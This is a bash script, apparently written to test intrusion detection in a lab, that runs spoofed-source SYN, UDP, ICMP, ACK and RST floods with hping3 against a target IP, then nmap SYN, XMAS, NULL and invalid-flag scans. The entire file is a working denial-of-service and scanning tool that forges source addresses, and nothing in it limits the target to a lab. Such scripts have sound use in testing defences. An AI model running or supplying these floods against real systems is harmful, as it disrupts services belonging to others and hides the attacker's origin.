#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-192.168.56.20}"
DURATION="${DURATION:-10}"

gen_ip() { echo "10.0.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))"; }

echo -e "\033[1;33m[*] Starting L3/L4 Attacks (DDoS & Scans) against $TARGET\033[0m"

for type in syn udp icmp ack rst; do
    ip=$(gen_ip)
    echo "[+] $type Flood (Spoofed IP: $ip)"
    case "$type" in
        syn)  sudo timeout "$DURATION" hping3 -S -i u200 -c 30000 -a "$ip" -p 443 "$TARGET" > /dev/null 2>&1 || true ;;
        udp)  sudo timeout "$DURATION" hping3 --udp -i u200 -c 30000 -a "$ip" -p 53 "$TARGET" > /dev/null 2>&1 || true ;;
        icmp) sudo timeout "$DURATION" hping3 --icmp -i u200 -c 30000 -a "$ip" "$TARGET" > /dev/null 2>&1 || true ;;
        ack)  sudo timeout "$DURATION" hping3 -A -i u200 -c 30000 -a "$ip" -p 443 "$TARGET" > /dev/null 2>&1 || true ;;
        rst)  sudo timeout "$DURATION" hping3 -R -i u200 -c 30000 -a "$ip" -p 443 "$TARGET" > /dev/null 2>&1 || true ;;
    esac
    sleep 1
done

echo "[+] Nmap SYN Scan (Real IP - Active Response will ban you!)"
sudo timeout 15 nmap -sS -p 1-100 "$TARGET" > /dev/null 2>&1 || true
sleep 1

ip=$(gen_ip)
echo "[+] XMAS Scan (Spoofed IP: $ip)"
sudo hping3 -F -P -U -a "$ip" -c 20 -p 80 "$TARGET" > /dev/null 2>&1 || true
sleep 1

ip=$(gen_ip)
echo "[+] NULL Scan (Spoofed IP: $ip)"
sudo hping3 -0 -a "$ip" -c 20 -p 80 "$TARGET" > /dev/null 2>&1 || true
sleep 1

ip=$(gen_ip)
echo "[+] Invalid Flags: SYN+FIN / SYN+RST (Spoofed IP: $ip)"
sudo hping3 -S -F -a "$ip" -c 10 -p 80 "$TARGET" > /dev/null 2>&1 || true
sudo hping3 -S -R -a "$ip" -c 10 -p 80 "$TARGET" > /dev/null 2>&1 || true

echo -e "\033[1;32m[+] L3/L4 Suite Finished.\033[0m"
